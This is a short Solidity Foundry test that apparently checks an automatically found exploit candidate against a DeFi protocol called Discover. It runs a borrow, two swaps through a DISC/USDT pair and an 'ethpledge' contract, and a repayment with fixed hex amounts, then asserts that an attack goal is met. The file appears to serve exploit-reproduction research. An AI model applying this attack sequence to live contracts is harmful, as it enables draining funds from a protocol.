// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./Discover.t.sol";

contract DiscoverVerify is DiscoverTest {
    function test_verify_cand003_0() public {
        uint256 amt0 = 0x1000000000000000000001;
        uint256 amt1 = 0xeb817cba9d94bdeb2cc;
        uint256 amt2 = 0x332001cf8442ca6aaad;
        uint256 amt3 = 0x100003e7336287142005db;
        borrow_disc(amt0);
        swap_pair_disc_usdt(amt1);
        swap_ethpledge_usdt_disc(amt2);
        payback_disc(amt3);
        require(attackGoal(), "Attack failed!");
    }
}
